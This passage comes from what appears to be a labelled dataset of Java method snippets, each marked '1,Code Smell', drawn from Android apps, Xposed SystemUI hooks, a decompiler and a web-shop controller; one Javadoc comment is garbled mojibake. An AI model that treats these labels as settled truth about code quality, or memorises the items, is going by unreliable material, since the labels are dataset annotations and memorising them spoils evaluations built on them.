      if (refSchema.get$ref() != null) {
        ref=refSchema.get$ref();
        String schemaKey=ref.substring(ref.lastIndexOf('/') + 1);
        schemaToAdd=schemas.get(schemaKey);
      }
 else       if (CatsModelUtils.isArraySchema(refSchema)) {
        ref=refSchema.getItems().get$ref();
        refSchema.set$ref(ref);
        schemaToAdd=refSchema;
      }
    }
  }
 else   if (content != null && !content.isEmpty() && schemas.get(schemaName) == null) {
    LOGGER.warn(""Content-Type not supported. Found: {} for {}"",content.keySet(),schemaName);
  }
  schemas.putIfAbsent(schemaName,schemaToAdd);
}",1,Code Smell
"@Override protected void assignSplits(){
  if (sourceConfig.isScanNewlyAddedTableEnabled() && streamSplitTaskId != null && !receiveOffsetCommitAck && isNewlyAddedAssigning(splitAssigner.getAssignerStatus())) {
    return;
  }
  super.assignSplits();
}
",1,Code Smell
"private void placeClock(){
  ViewGroup parent=(ViewGroup)mClockView.getParent();
  ViewGroup targetArea=null;
  Integer index=null;
switch (clockPosition) {
case POSITION_LEFT:
    if (notificationAreaMultiRow) {
      targetArea=mLeftExtraRowContainer;
      index=0;
    }
 else {
      targetArea=mStatusbarStartSide;
      index=1;
    }
  mClockView.setPadding(0,0,leftClockPadding,0);
break;
case POSITION_CENTER:
targetArea=(ViewGroup)mCenteredIconArea;
mClockView.setPadding(rightClockPadding,0,rightClockPadding,0);
break;
case POSITION_RIGHT:
mClockView.setPadding(rightClockPadding,0,0,0);
targetArea=((ViewGroup)mSystemIconArea.getParent());
break;
}
parent.removeView(mClockView);
if (index != null) {
targetArea.addView(mClockView,index);
}
 else {
targetArea.addView(mClockView);
}
}",1,Code Smell
"@Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpParam) throws Throwable {
  if (!lpParam.packageName.equals(listenPackage))   return;
  Class<?> IconManagerClass=findClass(""com.android.systemui.statusbar.phone.StatusBarIconController$IconManager"",lpParam.classLoader);
  hookAllConstructors(IconManagerClass,new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param) throws Throwable {
      if (!systemIconsMultiRow)       return;
      try {
        View linearStatusbarIconContainer=(View)param.args[0];
        String id=mContext.getResources().getResourceName(((View)linearStatusbarIconContainer.getParent().getParent()).getId());
        if (!id.contains(""status_bar_end_side_content""))         return;
        FlexStatusIconContainer flex=new FlexStatusIconContainer(mContext,lpParam.classLoader,linearStatusbarIconContainer);
        flex.setPadding(linearStatusbarIconContainer.getPaddingLeft(),0,linearStatusbarIconContainer.getPaddingRight(),0);
        LinearLayout.LayoutParams flexParams=new LinearLayout.LayoutParams(0,ViewGroup.LayoutParams.MATCH_PARENT,1);
        flex.setLayoutParams(flexParams);
        flex.setForegroundGravity(Gravity.CENTER_VERTICAL | Gravity.END);
        ViewGroup parent=(ViewGroup)linearStatusbarIconContainer.getParent();
        int index=parent.indexOfChild(linearStatusbarIconContainer);
        parent.addView(flex,index);
        parent.getLayoutParams().height=LinearLayout.LayoutParams.MATCH_PARENT;
        linearStatusbarIconContainer.setVisibility(View.GONE);
        param.args[0]=flex;
      }
 catch (      Throwable ignored) {
      }
    }
  }
);
}",1,Code Smell
"@Override public void tick(){
  if (removedInVoid()) {
    return;
  }
  if (hooked || !isInAir() && !isInWater() || isOnGround()) {
    motion=Vector3f.ZERO;
    return;
  }
  float gravity=getGravity();
  motion=motion.down(gravity);
  moveAbsoluteImmediate(position.add(motion),getYaw(),getPitch(),getHeadYaw(),isOnGround(),false);
  float drag=getDrag();
  motion=motion.mul(drag);
}",1,Code Smell
"/** 
 * Returns the extent to which a renderer supports adaptation between supported tracks in a specified  {@link TrackGroup}. <p>Tracks for which  {@link #getTrackSupport(int,int,int)} returns {@link RendererCapabilities#FORMAT_HANDLED} are always considered. Tracks for which {@link #getTrackSupport(int,int,int)} returns {@link RendererCapabilities#FORMAT_EXCEEDS_CAPABILITIES} are also considered if {@code includeCapabilitiesExceededTracks} is set to {@code true}. Tracks for which  {@link #getTrackSupport(int,int,int)} returns {@link RendererCapabilities#FORMAT_UNSUPPORTED_DRM}, {@link RendererCapabilities#FORMAT_UNSUPPORTED_TYPE} or {@link RendererCapabilities#FORMAT_UNSUPPORTED_SUBTYPE} are never considered.
 * @param rendererIndex The renderer index.
 * @param groupIndex The index of the track group.
 * @param includeCapabilitiesExceededTracks Whether tracks that exceed the capabilities of therenderer are included when determining support.
 * @return One of {@link RendererCapabilities#ADAPTIVE_SEAMLESS},  {@link RendererCapabilities#ADAPTIVE_NOT_SEAMLESS} and {@link RendererCapabilities#ADAPTIVE_NOT_SUPPORTED}.
 */
public int getAdaptiveSupport(int rendererIndex,int groupIndex,boolean includeCapabilitiesExceededTracks){
  int trackCount=rendererTrackGroups[rendererIndex].get(groupIndex).length;
  int[] trackIndices=new int[trackCount];
  int trackIndexCount=0;
  for (int i=0; i < trackCount; i++) {
    int fixedSupport=getTrackSupport(rendererIndex,groupIndex,i);
    if (fixedSupport == RendererCapabilities.FORMAT_HANDLED || (includeCapabilitiesExceededTracks && fixedSupport == RendererCapabilities.FORMAT_EXCEEDS_CAPABILITIES)) {
      trackIndices[trackIndexCount++]=i;
    }
  }
  trackIndices=Arrays.copyOf(trackIndices,trackIndexCount);
  return getAdaptiveSupport(rendererIndex,groupIndex,trackIndices);
}
/** 
 * Returns the extent to which a renderer supports adaptation between specified tracks within a {@link TrackGroup}.
 * @param rendererIndex The renderer index.
 * @param groupIndex The index of the track group.
 * @return One of {@link RendererCapabilities#ADAPTIVE_SEAMLESS},  {@link RendererCapabilities#ADAPTIVE_NOT_SEAMLESS} and {@link RendererCapabilities#ADAPTIVE_NOT_SUPPORTED}.
 */
public int getAdaptiveSupport(int rendererIndex,int groupIndex,int[] trackIndices){
  int handledTrackCount=0;
  int adaptiveSupport=RendererCapabilities.ADAPTIVE_SEAMLESS;
  boolean multipleMimeTypes=false;
  String firstSampleMimeType=null;
  for (int i=0; i < trackIndices.length; i++) {
    int trackIndex=trackIndices[i];
    String sampleMimeType=rendererTrackGroups[rendererIndex].get(groupIndex).getFormat(trackIndex).sampleMimeType;
    if (handledTrackCount++ == 0) {
      firstSampleMimeType=sampleMimeType;
    }
 else {
      multipleMimeTypes|=!Util.areEqual(firstSampleMimeType,sampleMimeType);
    }
    adaptiveSupport=Math.min(adaptiveSupport,rendererFormatSupports[rendererIndex][groupIndex][i] & RendererCapabilities.ADAPTIVE_SUPPORT_MASK);
  }
  return multipleMimeTypes ? Math.min(adaptiveSupport,rendererMixedMimeTypeAdaptiveSupports[rendererIndex]) : adaptiveSupport;
}",1,Code Smell
"@Override public void didAudioDeviceChanged(AVAudioManager.AudioDevice device){
  if (device == AVAudioManager.AudioDevice.WIRED_HEADSET || device == AVAudioManager.AudioDevice.EARPIECE || device == AVAudioManager.AudioDevice.BLUETOOTH) {
    speakerImageView.setSelected(false);
  }
 else {
    speakerImageView.setSelected(true);
  }
}
",1,Code Smell
"@Override public TextBuffer toJava(int indent,BytecodeMappingTracer tracer){
  TextBuffer buf=new TextBuffer();
  buf.append(ExprProcessor.listToJava(varDefinitions,indent,tracer));
  buf.append(first.toJava(indent,tracer));
  if (isLabeled()) {
    buf.appendIndent(indent).append(""label"").append(this.id.toString()).append("":"").appendLineSeparator();
    tracer.incrementCurrentSourceLine();
  }
  buf.appendIndent(indent).append(headexprent.get(0).toJava(indent,tracer)).append("" {"").appendLineSeparator();
  tracer.incrementCurrentSourceLine();
  if (ifstat == null) {
    boolean semicolon=false;
    if (ifedge.explicit) {
      semicolon=true;
      if (ifedge.getType() == StatEdge.TYPE_BREAK) {
        buf.appendIndent(indent + 1).append(""break"");
      }
 else {
        buf.appendIndent(indent + 1).append(""continue"");
      }
      if (ifedge.labeled) {
        buf.append("" label"").append(ifedge.closure.id.toString());
      }
    }
    if (semicolon) {
      buf.append("";"").appendLineSeparator();
      tracer.incrementCurrentSourceLine();
    }
  }
 else {
    buf.append(ExprProcessor.jmpWrapper(ifstat,indent + 1,true,tracer));
  }
  boolean elseif=false;
  if (elsestat != null) {
    if (elsestat.type == TYPE_IF && elsestat.varDefinitions.isEmpty() && elsestat.getFirst().getExprents().isEmpty() && !elsestat.isLabeled() && (elsestat.getSuccessorEdges(STATEDGE_DIRECT_ALL).isEmpty() || !elsestat.getSuccessorEdges(STATEDGE_DIRECT_ALL).get(0).explicit)) {
      buf.appendIndent(indent).append(""} else "");
      TextBuffer content=ExprProcessor.jmpWrapper(elsestat,indent,false,tracer);
      content.setStart(TextUtil.getIndentString(indent).length());
      buf.append(content);
      elseif=true;
    }
 else {
      BytecodeMappingTracer else_tracer=new BytecodeMappingTracer(tracer.getCurrentSourceLine() + 1);
      TextBuffer content=ExprProcessor.jmpWrapper(elsestat,indent + 1,false,else_tracer);
      if (content.length() > 0) {
        buf.appendIndent(indent).append(""} else {"").appendLineSeparator();
        tracer.setCurrentSourceLine(else_tracer.getCurrentSourceLine());
        tracer.addTracer(else_tracer);
        buf.append(content);
      }
    }
  }
  if (!elseif) {
    buf.appendIndent(indent).append(""}"").appendLineSeparator();
    tracer.incrementCurrentSourceLine();
  }
  return buf;
}",1,Code Smell
"private void initFourLetterTab(){
  fourLetterCommandRequestArea.setOnKeyPressed(e -> {
    if (e.getCode() == KeyCode.ENTER) {
      String command=fourLetterCommandRequestArea.getText();
      if (command == null || command.trim().equals("""") || command.length() != 4) {
        VToast.error(""command is invalid: must be 4 words!"");
      }
 else {
        fourLetterCommandRequestArea.clear();
        String currentServer=ActiveServerContext.get();
        String response=prettyZooFacade.executeFourLetterCommand(currentServer,command);
        fourLetterCommandResponseArea.clear();
        fourLetterCommandResponseArea.setText(response);
      }
    }
  }
);
}",1,Code Smell
"public InventorySorter(HandledScreen<?> screen,Slot originSlot){
  this.screen=screen;
  this.originInvPart=getInvPart(originSlot);
  if (originInvPart == InvPart.Invalid || originInvPart == InvPart.Hotbar || screen instanceof PeekScreen) {
    invalid=true;
    return;
  }
  this.actions=new ArrayList<>();
  generateActions();
}
",1,Code Smell
"@SuppressWarnings(""unchecked"") public <P extends T>boolean translate(Class<? extends P> clazz,P packet,GeyserSession session,boolean canRunImmediately){
  if (session.getUpstream().isClosed() || session.isClosed()) {
    return false;
  }
  PacketTranslator<P> translator=(PacketTranslator<P>)this.mappings.get(clazz);
  if (translator != null) {
    EventLoop eventLoop=session.getTickEventLoop();
    if (canRunImmediately || !translator.shouldExecuteInEventLoop() || eventLoop.inEventLoop()) {
      translate0(session,translator,packet);
    }
 else {
      eventLoop.execute(() -> translate0(session,translator,packet));
    }
    return true;
  }
 else {
    if (GeyserImpl.getInstance().getConfig().isDebugMode()) {
      if (!IGNORED_PACKETS.contains(clazz)) {
        GeyserImpl.getInstance().getLogger().debug(""Could not find packet for "" + (packet.toString().length() > 25 ? packet.getClass().getSimpleName() : packet));
      }
    }
    return false;
  }
}",1,Code Smell
"private boolean jvmActivityFlag(String line){
  if (diary.isStateKnown(SupportedFlags.APPLICATION_STOPPED_TIME,SupportedFlags.APPLICATION_CONCURRENT_TIME,SupportedFlags.TLAB_DATA))   return false;
  if ((JVMPatterns.APPLICATION_STOP_TIME.parse(line) != null) || (JVMPatterns.SIMPLE_APPLICATION_STOP_TIME.parse(line) != null) || JVMPatterns.APPLICATION_STOP_TIME_WITH_STOPPING_TIME.parse(line) != null) {
    diary.setTrue(SupportedFlags.APPLICATION_STOPPED_TIME);
    return true;
  }
 else   if ((JVMPatterns.APPLICATION_TIME.parse(line) != null) || (JVMPatterns.SIMPLE_APPLICATION_TIME.parse(line) != null)) {
    diary.setTrue(SupportedFlags.APPLICATION_CONCURRENT_TIME);
    return true;
  }
 else   if (JVMPatterns.TLAB_CONT.parse(line) != null) {
    diary.setTrue(SupportedFlags.TLAB_DATA);
    return true;
  }
  if (collectionCount > 1) {
    diary.setFalse(SupportedFlags.APPLICATION_STOPPED_TIME,SupportedFlags.APPLICATION_CONCURRENT_TIME,SupportedFlags.TLAB_DATA);
  }
  return false;
}",1,Code Smell
"private void onMeasureInternal(int widthMeasureSpec,int heightMeasureSpec){
  int widthSize=MeasureSpec.getSize(widthMeasureSpec);
  int heightSize=MeasureSpec.getSize(heightMeasureSpec);
  setMeasuredDimension(widthSize,heightSize);
  widthSize-=backgroundPaddingLeft * 2;
  int keyboardSize=0;
  if (!commentTextView.isWaitingForKeyboardOpen() && keyboardSize <= AndroidUtilities.dp(20) && !commentTextView.isPopupShowing() && !commentTextView.isAnimatePopupClosing()) {
    ignoreLayout=true;
    commentTextView.hideEmojiView();
    ignoreLayout=false;
  }
  if (keyboardSize <= AndroidUtilities.dp(20)) {
    int paddingBottom;
    if (keyboardVisible) {
      paddingBottom=0;
    }
 else {
      paddingBottom=commentTextView.getEmojiPadding();
    }
    if (!AndroidUtilities.isInMultiwindow) {
      heightSize-=paddingBottom;
      heightMeasureSpec=MeasureSpec.makeMeasureSpec(heightSize,MeasureSpec.EXACTLY);
    }
    ignoreLayout=true;
    currentAttachLayout.onPreMeasure(widthSize,heightSize);
    if (nextAttachLayout != null) {
      nextAttachLayout.onPreMeasure(widthSize,heightSize);
    }
    ignoreLayout=false;
  }
  int childCount=getChildCount();
  for (int i=0; i < childCount; i++) {
    View child=getChildAt(i);
    if (child == null || child.getVisibility() == GONE) {
      continue;
    }
    if (commentTextView != null && commentTextView.isPopupView(child)) {
      if (inBubbleMode) {
        child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(heightSize + getPaddingTop(),MeasureSpec.EXACTLY));
      }
 else       if (AndroidUtilities.isInMultiwindow || AndroidUtilities.isTablet()) {
        if (AndroidUtilities.isTablet()) {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(Math.min(AndroidUtilities.dp(AndroidUtilities.isTablet() ? 200 : 320),heightSize - AndroidUtilities.statusBarHeight + getPaddingTop()),MeasureSpec.EXACTLY));
        }
 else {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(heightSize - AndroidUtilities.statusBarHeight + getPaddingTop(),MeasureSpec.EXACTLY));
        }
      }
 else {
        child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(child.getLayoutParams().height,MeasureSpec.EXACTLY));
      }
    }
 else {
      measureChildWithMargins(child,widthMeasureSpec,0,heightMeasureSpec,0);
    }
  }
}",1,Code Smell
"@Override public boolean processClass(ClassNode node){
  if (ENUM.contains(node.name)) {
    var find=false;
    for (    FieldNode field : node.fields) {
      if (Modifier.isStatic(field.access) && Modifier.isFinal(field.access) && field.name.equals(""ENUM$VALUES"")) {
        field.access&=~Opcodes.ACC_FINAL;
        Implementer.LOGGER.debug(""Definalize enum class {} values field {}"",node.name,field.name);
        if (find) {
          throw new IllegalStateException(""Duplicate static final field found for "" + node.name + "": ""+ field.name);
        }
 else {
          find=true;
        }
      }
    }
    if (!find) {
      throw new IllegalStateException(""No static final field found for "" + node.name);
    }
    return true;
  }
  return false;
}
",1,Code Smell
"@SuppressWarnings(""unchecked"") Object getUIDefaultProperty(Object key){
  if (inGetDefaultFont)   return null;
  if (!(key instanceof String))   return null;
  if (((String)key).endsWith(""UI""))   return null;
  if (UIDefaultsLoaderAccessor.KEY_VARIABLES.equals(key)) {
    if (inGetVariables)     return null;
    inGetVariables=true;
    try {
      return new VariablesDelegateMap((Map<String,String>)UIManager.get(UIDefaultsLoaderAccessor.KEY_VARIABLES));
    }
  finally {
      inGetVariables=false;
    }
  }
  Object value=textArea.propertiesSupport.getParsedProperty((String)key);
  boolean isDefaultFont=""defaultFont"".equals(key);
  inGetDefaultFont=isDefaultFont;
  try {
    if (value instanceof LazyValue) {
      value=lazyValueCache.computeIfAbsent((LazyValue)value,k -> {
        return k.createValue(null);
      }
);
    }
 else     if (value instanceof ActiveValue)     value=((ActiveValue)value).createValue(null);
  }
  finally {
    inGetDefaultFont=false;
  }
  if (isDefaultFont && !(value instanceof Font))   return null;
  if (value == null && FlatThemePropertiesBaseManager.getDefindedCoreKeys().contains(key) && !isDefaultFont)   return FlatLaf.NULL_VALUE;
  return value;
}
",1,Code Smell
"@NonNull @Override protected InteractionResult mobInteract(@NonNull Hand hand,@NonNull GeyserItemStack itemInHand){
  if (this.canDuplicate && getFlag(EntityFlag.DANCING) && isDuplicationItem(itemInHand)) {
    return InteractionResult.SUCCESS;
  }
 else   if (!this.hand.isValid() && !itemInHand.isEmpty()) {
    return InteractionResult.SUCCESS;
  }
 else   if (this.hand.isValid() && hand == Hand.MAIN_HAND && itemInHand.isEmpty()) {
    return InteractionResult.SUCCESS;
  }
 else {
    return super.mobInteract(hand,itemInHand);
  }
}
",1,Code Smell
"private boolean isCancelled(View view,MotionEvent event){
  int[] location=new int[2];
  view.getLocationOnScreen(location);
  if (event.getRawX() < location[0] || event.getRawX() > location[0] + view.getWidth() || event.getRawY() < location[1] - 40) {
    return true;
  }
  return false;
}",1,Code Smell
"/** 
 * 修改
 */
@RequestMapping(value=""/goods/update"",method=RequestMethod.POST) @ResponseBody public Result update(@RequestBody NewBeeMallGoods newBeeMallGoods){
  if (Objects.isNull(newBeeMallGoods.getGoodsId()) || !StringUtils.hasText(newBeeMallGoods.getGoodsName()) || !StringUtils.hasText(newBeeMallGoods.getGoodsIntro())|| !StringUtils.hasText(newBeeMallGoods.getTag())|| Objects.isNull(newBeeMallGoods.getOriginalPrice())|| Objects.isNull(newBeeMallGoods.getSellingPrice())|| Objects.isNull(newBeeMallGoods.getGoodsCategoryId())|| Objects.isNull(newBeeMallGoods.getStockNum())|| Objects.isNull(newBeeMallGoods.getGoodsSellStatus())|| !StringUtils.hasText(newBeeMallGoods.getGoodsCoverImg())|| !StringUtils.hasText(newBeeMallGoods.getGoodsDetailContent())) {
    return ResultGenerator.genFailResult(""参数异常！"");
  }
  String result=newBeeMallGoodsService.updateNewBeeMallGoods(newBeeMallGoods);
  if (ServiceResultEnum.SUCCESS.getResult().equals(result)) {
    return ResultGenerator.genSuccessResult();
  }
 else {
    return ResultGenerator.genFailResult(result);
  }
}
",1,Code Smell
"@Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpParam) throws Throwable {
  if (!lpParam.packageName.equals(listenPackage))   return;
  mLockscreenDoubleTapToSleep=new GestureDetector(mContext,new GestureDetector.SimpleOnGestureListener(){
    @Override public boolean onDoubleTap(    MotionEvent e){
      sleep();
      return true;
    }
  }
);
  Class<?> NotificationShadeWindowViewControllerClass=findClass(""com.android.systemui.shade.NotificationShadeWindowViewController"",lpParam.classLoader);
  Class<?> NotificationPanelViewControllerClass=findClass(""com.android.systemui.shade.NotificationPanelViewController"",lpParam.classLoader);
  Class<?> DozeTriggersClass=findClass(""com.android.systemui.doze.DozeTriggers"",lpParam.classLoader);
  Class<?> PhoneStatusBarViewControllerClass=findClass(""com.android.systemui.statusbar.phone.PhoneStatusBarViewController"",lpParam.classLoader);
  try {
    hookTouchHandler(PhoneStatusBarViewControllerClass);
  }
 catch (  Throwable ignored) {
  }
  hookAllMethods(DozeTriggersClass,""onSensor"",new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param) throws Throwable {
      if ((TapToShowAmbient && !doubleTapToWake && param.args[0].equals(REASON_SENSOR_TAP)) || (PickToShowAmbient && param.args[0].equals(REASON_SENSOR_PICKUP))) {
        showAmbientDisplay(param.thisObject);
        param.setResult(null);
        return;
      }
      if (doubleTapToWake && ((int)param.args[0]) == REASON_SENSOR_TAP) {
        if (!mDoubleTap) {
          mDoubleTap=true;
          mTimer=new Timer();
          mTimer.schedule(new TimerTask(){
            @Override public void run(){
              mDoubleTap=false;
              if (TapToShowAmbient)               showAmbientDisplay(param.thisObject);
            }
          }
,400);
          param.setResult(null);
        }
 else {
          mTimer.cancel();
          mDoubleTap=false;
        }
      }
    }
  }
);
  hookAllConstructors(NotificationShadeWindowViewControllerClass,new XC_MethodHook(){
    @Override protected void afterHookedMethod(    MethodHookParam param) throws Throwable {
      new Thread(() -> {
        sleep(5000);
        setHooks(param);
      }
).start();
    }
  }
);
  hookAllConstructors(NotificationPanelViewControllerClass,new XC_MethodHook(){
    @Override protected void afterHookedMethod(    MethodHookParam param) throws Throwable {
      NotificationPanelViewController=param.thisObject;
      hookLockScreenCustomizePill();
      try {
        hookTouchHandler(getObjectField(param.thisObject,""mStatusBarViewTouchEventHandler"").getClass());
      }
 catch (      Throwable ignored) {
      }
    }
  }
);
  hookAllMethods(NotificationPanelViewControllerClass,""createTouchHandler"",new XC_MethodHook(){
    @Override protected void afterHookedMethod(    MethodHookParam param) throws Throwable {
      NotificationPanelViewController=param.thisObject;
      hookLockScreenCustomizePill();
      hookTouchHandler(param.getResult().getClass());
    }
  }
);
}",1,Code Smell
"/** 
 * Returns true if a and b are equal, including if they are both null. <p><i>Note: In platform versions 1.1 and earlier, this method only worked well if both the arguments were instances of String.</i></p>
 * @param a first CharSequence to check
 * @param b second CharSequence to check
 * @return true if a and b are equal
 */
public static boolean equals(@Nullable final CharSequence a,@Nullable final CharSequence b){
  if (a == b) {
    return true;
  }
  final int length;
  if (a != null && b != null && (length=a.length()) == b.length()) {
    if (a instanceof String && b instanceof String) {
      return a.equals(b);
    }
    for (int i=0; i < length; i++) {
      if (a.charAt(i) != b.charAt(i)) {
        return false;
      }
    }
    return true;
  }
  return false;
}",1,Code Smell
"public InetAddress resolveIp() throws UnknownHostException {
  if (ip.isEmpty() || ip.equals(""0.0.0.0"") || ip.equals(""::0"")) {
    return new InetSocketAddress(0).getAddress();
  }
 else   if (ip.equals(""#getLocalHost"")) {
    return InetAddress.getLocalHost();
  }
 else {
    return InetAddress.getByName(ip);
  }
}",1,Code Smell
"private boolean isChanged(AppConnInfo one,AppConnInfo other){
  if (one.getAppConnResource() == null && other.getAppConnResource() == null) {
    return false;
  }
 else   if (one.getAppConnResource() == null || other.getAppConnResource() == null) {
    return true;
  }
 else {
    return !one.getAppConnResource().equals(other.getAppConnResource());
  }
}
private boolean isChanged(List<? extends AppInstanceInfo> one,List<AppInstance> other){
  if (CollectionUtils.isEmpty(one) && CollectionUtils.isEmpty(other)) {
    return false;
  }
 else   if (CollectionUtils.isEmpty(one) || CollectionUtils.isEmpty(other) || one.size() != other.size()) {
    return true;
  }
 else {
    return one.stream().anyMatch(newOne -> other.stream().noneMatch(otherOne -> otherOne.getId().equals(newOne.getId())) || other.stream().anyMatch(otherOne -> otherOne.getId().equals(newOne.getId()) && (!StringUtils.equals(newOne.getUrl(),otherOne.getBaseUrl()) || ((StringUtils.isNotEmpty(newOne.getHomepageUri()) || StringUtils.isNotEmpty(otherOne.getHomepageUri())) && !StringUtils.equals(newOne.getHomepageUri(),otherOne.getHomepageUri())) || ((StringUtils.isNotEmpty(newOne.getEnhanceJson()) || MapUtils.isNotEmpty(otherOne.getConfig())) && !otherOne.getConfig().equals(DSSCommonUtils.COMMON_GSON.fromJson(newOne.getEnhanceJson(),Map.class))))));
  }
}
",1,Code Smell
"/** 
 * Parses an AudioMuxElement as defined in 14496-3:2009, Section 1.7.3.1, Table 1.41.
 * @param data A {@link ParsableBitArray} containing the AudioMuxElement's bytes.
 */
private void parseAudioMuxElement(ParsableBitArray data) throws ParserException {
  boolean useSameStreamMux=data.readBit();
  if (!useSameStreamMux) {
    streamMuxRead=true;
    parseStreamMuxConfig(data);
  }
 else   if (!streamMuxRead) {
    return;
  }
  if (audioMuxVersionA == 0) {
    if (numSubframes != 0) {
      throw new ParserException();
    }
    int muxSlotLengthBytes=parsePayloadLengthInfo(data);
    parsePayloadMux(data,muxSlotLengthBytes);
    if (otherDataPresent) {
      data.skipBits((int)otherDataLenBits);
    }
  }
 else {
    throw new ParserException();
  }
}",1,Code Smell
"private boolean checkAutoscrollToStories(ViewPage viewPage){
  if ((hasStories || (filterTabsView != null && filterTabsView.getVisibility() == View.VISIBLE)) && !rightSlidingDialogContainer.hasFragment()) {
    int scrollY=(int)-scrollYOffset;
    int actionBarHeight=getMaxScrollYOffset();
    if (scrollY != 0 && scrollY != actionBarHeight) {
      if (scrollY < actionBarHeight / 2) {
        if (viewPage.listView.canScrollVertically(-1)) {
          viewPage.scroller.smoothScrollBy(-scrollY);
          return true;
        }
      }
 else       if (viewPage.listView.canScrollVertically(1)) {
        viewPage.scroller.smoothScrollBy(actionBarHeight - scrollY);
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"private ArrayList<String> getSelectedList(InviteJoinData inviteJoinData){
  ArrayList<String> selectedList=new ArrayList<>();
  if (inviteJoinData == null || inviteJoinData.data == null || inviteJoinData.data.roomInfo == null || inviteJoinData.data.roomInfo.getUserList() == null) {
    return selectedList;
  }
  List<RoomMsgUserEntity> userList=inviteJoinData.data.roomInfo.getUserList();
  for (  RoomMsgUserEntity item : userList) {
    selectedList.add(item.getUserId());
  }
  return selectedList;
}
",1,Code Smell
"private void tryToAutoLogin(){
  int loginStatus=V2TIMManager.getInstance().getLoginStatus();
  int lastLoginCode=UserInfo.getInstance().getLastLoginCode();
  UserInfo userInfo=UserInfo.getInstance();
  if (loginStatus == V2TIMManager.V2TIM_STATUS_LOGOUT && !TextUtils.isEmpty(userInfo.getUserId()) && userInfo.isAutoLogin()) {
    if (lastLoginCode >= BaseConstants.ERR_SDK_NET_ENCODE_FAILED && lastLoginCode <= BaseConstants.ERR_SDK_NET_SEND_REMAINING_TIMEOUT_NO_NETWORK) {
      DemoLog.i(TAG,""onConnectSuccess, login IMSDK"");
      loginIMSDK(TIMAppService.getAppContext(),AppConfig.DEMO_SDK_APPID,userInfo.getUserId(),userInfo.getUserSig(),TUIUtils.getLoginConfig(),new TUICallback(){
        @Override public void onSuccess(){
        }
        @Override public void onError(        int errorCode,        String errorMessage){
          UserInfo.getInstance().setLastLoginCode(errorCode);
          DemoLog.e(TAG,""tryToAutoLogin error:"" + errorCode);
          if (errorCode < BaseConstants.ERR_SDK_NET_ENCODE_FAILED || errorCode > BaseConstants.ERR_SDK_NET_SEND_REMAINING_TIMEOUT_NO_NETWORK) {
            if (AppConfig.DEMO_UI_STYLE == AppConfig.DEMO_UI_STYLE_CLASSIC) {
              MainActivity.finishMainActivity();
            }
 else {
              MainMinimalistActivity.finishMainActivity();
            }
            TIMAppService.getInstance().startLoginActivity();
          }
        }
      }
);
    }
  }
}",1,Code Smell
"private int getCurrentColor(boolean partOfPattern){
  if (!partOfPattern || mInStealthMode || mPatternInProgress) {
    return mRegularColor;
  }
 else   if (mPatternDisplayMode == DisplayMode.Wrong) {
    return mErrorColor;
  }
 else   if (mPatternDisplayMode == DisplayMode.Correct || mPatternDisplayMode == DisplayMode.Animate) {
    return mSuccessColor;
  }
 else {
    throw new IllegalStateException(""unknown display mode "" + mPatternDisplayMode);
  }
}
",1,Code Smell
"@Override public ITileHandle<POS,T> get(){
  long minimumTimestamp=this.minimumTimestamp();
  long worldTimestamp=this.world.lastCompletedTick;
  checkState(worldTimestamp >= minimumTimestamp,""worldTimestamp (%d) is less than minimumTimestamp (%d)?!?"",worldTimestamp,minimumTimestamp);
  if (this.handle.timestamp() >= minimumTimestamp) {
    return this.handle;
  }
  if (!(FP2_DEBUG && !FP2Config.global().debug().exactGeneration()) && this.world.anyVanillaTerrainExistsAt(this.pos)) {
    if (this.pos.level() == 0) {
      try {
        this.generateExact(worldTimestamp,false);
        return this.handle;
      }
 catch (      GenerationNotAllowedException e) {
      }
    }
 else {
      this.generateScale(worldTimestamp);
      return this.handle;
    }
  }
  if (this.world.canGenerateRough(this.pos)) {
    this.generateRough(worldTimestamp);
    return this.handle;
  }
  if (!this.allowNewGeneration()) {
    this.handle.clearDirty();
    return this.handle;
  }
  if (this.pos.level() == 0) {
    try {
      this.generateExact(worldTimestamp,true);
      return this.handle;
    }
 catch (    GenerationNotAllowedException e) {
      throw new IllegalArgumentException(""generation blocked while processing tile at "" + this.pos,e);
    }
  }
 else {
    this.generateScale(worldTimestamp);
    return this.handle;
  }
}",1,Code Smell
"/** 
 * 瀵瑰瘑鐮佺殑澶嶆潅鎬ц繘琛屾牎楠�
 * @param password 瀵嗙爜鏂囨湰
 * @throws PrivateValidationError 褰撳瘑鐮佷笉鍚堣姹傛椂鎶涘嚭
 */
private void validatePassword(String password) throws PrivateValidationError {
  if (password.length() < 10 || password.length() > 20) {
    throw new PrivateValidationError(""password"",locale.msg(""private.aas.updatePassword.wrongLength""));
  }
  Integer hasUpper=0;
  Integer hasLower=0;
  Integer hasDigit=0;
  Integer hasSymbol=0;
  if (!password.toLowerCase().equals(password)) {
    hasUpper=1;
  }
  if (!password.toUpperCase().equals(password)) {
    hasLower=1;
  }
  for (  char c : password.toCharArray()) {
    if (Character.isDigit(c)) {
      hasDigit=1;
    }
 else     if (Character.isUpperCase(c)) {
      hasUpper=1;
    }
 else     if (Character.isLowerCase(c)) {
      hasLower=1;
    }
 else {
      hasSymbol=1;
    }
  }
  if (hasUpper + hasLower + hasDigit+ hasSymbol < 3) {
    throw new PrivateValidationError(""password"",locale.msg(""private.aas.updatePassword.malformed""));
  }
}",1,Code Smell
"public static void setBestExposure(Camera.Parameters parameters,boolean lightOn){
  int minExposure=parameters.getMinExposureCompensation();
  int maxExposure=parameters.getMaxExposureCompensation();
  float step=parameters.getExposureCompensationStep();
  if ((minExposure != 0 || maxExposure != 0) && step > 0.0f) {
    float targetCompensation=lightOn ? MIN_EXPOSURE_COMPENSATION : MAX_EXPOSURE_COMPENSATION;
    int compensationSteps=Math.round(targetCompensation / step);
    float actualCompensation=step * compensationSteps;
    compensationSteps=Math.max(Math.min(compensationSteps,maxExposure),minExposure);
    if (parameters.getExposureCompensation() == compensationSteps) {
